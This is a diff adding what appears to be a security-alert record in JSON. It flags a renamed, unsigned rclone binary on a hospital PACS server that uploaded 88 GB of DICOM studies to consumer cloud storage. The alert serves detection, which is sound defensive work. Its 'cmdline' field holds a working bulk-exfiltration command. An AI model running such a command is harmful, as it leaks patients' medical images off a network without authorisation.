@@ -1,0 +1,25 @@
+{
+  "detection_id": "ldt:hvh0000000000000000000000000000:4517",
+  "max_severity_displayname": "Medium",
+  "created_timestamp": "2026-09-12T23:58:03Z",
+  "device": {
+    "hostname": "HV-PACS-01",
+    "os_version": "Windows Server 2019",
+    "groups": ["PACS Imaging Servers"]
+  },
+  "behaviors": [
+    {
+      "display_name": "Large upload by cloud sync tool",
+      "timestamp": "2026-09-12T23:57:40Z",
+      "user_name": "HVH\\priv-mokafor",
+      "filepath": "C:\\ProgramData\\imgsync.exe",
+      "cmdline": "imgsync.exe copy D:\\DICOM\\Studies remote:archive --transfers 16 --config C:\\ProgramData\\is.conf -q",
+      "parent_chain": ["C:\\Windows\\System32\\cmd.exe", "C:\\ProgramData\\hvtask.exe"],
+      "signer": "Unsigned (original filename rclone.exe)",
+      "prevalence": "Image seen on 1 host in last 30 days",
+      "sha256": "3c9aa97985d16861fec6c24aeff0066cf52153731b4a4138c58f74de12cd8030",
+      "network_summary": "88 GB uploaded to a consumer cloud storage API over 90 minutes",
+      "description": "First execution of this file in the environment; no change ticket for PACS archive migration"
+    }
+  ]
+}
